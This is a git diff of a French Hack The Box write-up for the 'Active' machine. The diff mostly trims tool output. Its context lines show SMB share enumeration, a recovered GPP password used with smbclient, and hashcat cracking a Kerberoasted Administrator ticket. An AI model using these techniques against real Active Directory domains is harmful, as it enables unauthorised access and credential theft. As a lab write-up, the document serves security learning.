@@ -1,6 +1,6 @@
 ---
 title: HTB | Active
-description: 
+description: Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.
 slug: active-htb
 date: 2025-01-05 00:00:00+0000
 #image: cover.png
@@ -88,21 +88,6 @@ PORT      STATE SERVICE       VERSION
 49165/tcp open  msrpc         Microsoft Windows RPC
 49166/tcp open  msrpc         Microsoft Windows RPC
 49168/tcp open  msrpc         Microsoft Windows RPC
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.94SVN%E=4%D=12/12%OT=53%CT=1%CU=31908%PV=Y%DS=1%DC=T%G=Y%TM=675
-OS:B6029%P=x86_64-pc-linux-gnu)SEQ(SP=11%GCD=FA00%ISR=9C%TI=I%CI=I%TS=U)SEQ
-OS:(SP=11%GCD=FA00%ISR=9C%TI=I%CI=RD%TS=U)OPS(O1=M5B4%O2=M5B4%O3=M5B4%O4=M5
-OS:B4%O5=M5B4%O6=M5B4)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)E
-OS:CN(R=Y%DF=N%T=40%W=FFFF%O=M5B4%CC=N%Q=)T1(R=Y%DF=N%T=40%S=O%A=S+%F=AS%RD
-OS:=0%Q=)T2(R=Y%DF=N%T=FF%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=N%T=FF%W=0%
-OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T4(R=Y%DF=N%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
-OS:R=Y%DF=N%T=40%W=FFFF%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=FF%W=0%S=A%A
-OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=FF%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)U1(R=Y%DF
-OS:=N%T=FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)
-
-Network Distance: 1 hop
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-security-mode: 
@@ -111,13 +96,6 @@ Host script results:
 | smb2-time: 
 |   date: 2024-12-12T22:13:57
 |_  start_date: 2024-12-12T22:09:06
-
-TRACEROUTE (using port 80/tcp)
-HOP RTT     ADDRESS
-1   0.19 ms 10.10.10.100
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 117.37 seconds
 ```
 
 ### enu4mlinux
@@ -153,7 +131,6 @@ Unable to connect with SMB1 -- no workgroup available
 //10.10.10.100/Replication      Mapping: OK Listing: OK Writing: N/A
 //10.10.10.100/SYSVOL   Mapping: DENIED Listing: N/A Writing: N/A
 //10.10.10.100/Users    Mapping: DENIED Listing: N/A Writing: N/A
-
 ```
 
 ## Foothold
@@ -189,7 +166,7 @@ GPPstillStandingStrong2k18
 ### user flag - SMB Share Users
 En scannat a nouveau les shares SMB, cette fois-ci avec notre user/password obtenu, on voit qu'on a acces au share "Users" en readonly. On y trouve un dossier
 avec le nom de notre utilisateur et tous ces fichiers Windows, avec le flag user.txt :
-1fc4.....a676
+> 1fc4.....a676
 ```bash
 ┌──(kali㉿kali)-[~/htb/Active/bloodhound1]
 └─$ smbclient //10.10.10.100/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
@@ -261,46 +238,6 @@ Ce résultat correspond au hash TGS récupéré pour le compte Administrator.
 » vim admin_hash.txt
 » hashcat -m 13100 -a 0 admin_hash.txt  ~/wordlists/rockyou.txt
 hashcat (v6.2.5) starting
-
-* Device #1: WARNING! Kernel exec timeout is not disabled.
-             This may cause "CL_OUT_OF_RESOURCES" or related errors.
-             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
-* Device #3: WARNING! Kernel exec timeout is not disabled.
-             This may cause "CL_OUT_OF_RESOURCES" or related errors.
-             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
-CUDA API (CUDA 12.4)
-====================
-* Device #1: NVIDIA GeForce GTX 1060 3GB, 2467/3003 MB, 9MCU
-
-OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-=====================================================================================================================================
-* Device #2: pthread-AMD Ryzen 5 1600X Six-Core Processor, skipped
-
-OpenCL API (OpenCL 3.0 CUDA 12.4.131) - Platform #2 [NVIDIA Corporation]
-========================================================================
-* Device #3: NVIDIA GeForce GTX 1060 3GB, skipped
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Temperature abort trigger set to 90c
-
-Host memory required for this attack: 79 MB
 
 Dictionary cache hit:
 * Filename..: /home/leopold/wordlists/rockyou.txt
